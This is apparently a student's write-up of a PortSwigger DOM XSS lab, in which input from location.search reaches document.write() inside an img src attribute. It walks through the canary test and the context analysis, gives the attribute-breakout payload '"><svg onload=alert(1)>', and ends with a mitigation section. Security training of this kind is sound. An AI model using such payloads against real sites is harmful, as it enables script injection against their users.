# Lab03 - DOM XSS in document.write Sink Using Source location.search

## Objective

Exploit a DOM-Based XSS vulnerability where user-controlled data from:

```javascript
location.search
```

is written directly into the page using:

```javascript
document.write()
```

and execute:

```javascript
alert(1)
```

---

# Lab Information

| Field | Value |
|---------|---------|
| Category | DOM-Based XSS |
| Difficulty | Apprentice |
| Source | location.search |
| Sink | document.write() |
| Context | HTML Attribute Context |
| Platform | PortSwigger |

---

# Vulnerability Overview

The application reads data from:

```javascript
location.search
```

and inserts it into the page using:

```javascript
document.write()
```

without proper sanitization.

The payload is reflected into an:

```html
img src=""
```

attribute.

---

# Source → Sink Flow

```text
location.search
        ↓
JavaScript Reads Parameter
        ↓
document.write()
        ↓
<img src="USER_INPUT">
        ↓
HTML Parsed
        ↓
JavaScript Executes
```

---

# Analysis

## Step 1

Navigate to search functionality.

---

## Step 2

Search:

```text
carry123
```

---

## Step 3

Inspect page source using:

```text
DevTools → Elements
```

---

Observation:

```text
carry123
```

appears inside:

```html
<img src="carry123">
```

---

## Step 4

Identify Context

Input appears inside:

```text
Double-Quoted Attribute Context
```

---

## Step 5

Craft Breakout Payload

Need to:

```text
Close Attribute
        ↓
Inject New Element
        ↓
Execute JavaScript
```

---

# Full Payload(s) Used

## Initial Probe

```text
carry123
```

---

## Final Payload

```html
"><svg onload=alert(1)>
```

---

# Why The Payload Works

Initial DOM:

```html
<img src="USER_INPUT">
```

---

Injected Payload:

```html
"><svg onload=alert(1)>
```

---

Result:

```html
<img src="">
<svg onload=alert(1)>
```

---

Execution Flow

```text
Attribute Closed
        ↓
SVG Created
        ↓
onload Event Fires
        ↓
alert(1)
```

---

# Personal Analysis & Testing Process

## Initial Goal

Determine where:

```text
location.search
```

appears.

---

## Canary Test

Used:

```text
carry123
```

---

Observed:

```html
<img src="carry123">
```

---

## Key Realization

Input lands inside:

```text
HTML Attribute Context
```

not:

```text
Free HTML Context
```

---

## Exploitation Strategy

Need attribute breakout.

Chosen payload:

```html
"><svg onload=alert(1)>
```

because:

```text
SVG supports onload
Works reliably
Short payload
```

---

## Result

```javascript
alert(1)
```

executed.

Lab solved.

---

# Mitigation

Avoid:

```javascript
document.write(
userInput
);
```

Use:

```javascript
textContent
```

or safe DOM APIs.

---

# Related Theory

- 14-what-is-dom-based-xss.md
- 15-sources-and-sinks.md
- 16-testing-dom-xss.md

---

# Key Learnings

- DOM XSS often requires context analysis.
- Attribute contexts require breakout payloads.
- document.write() is a dangerous sink.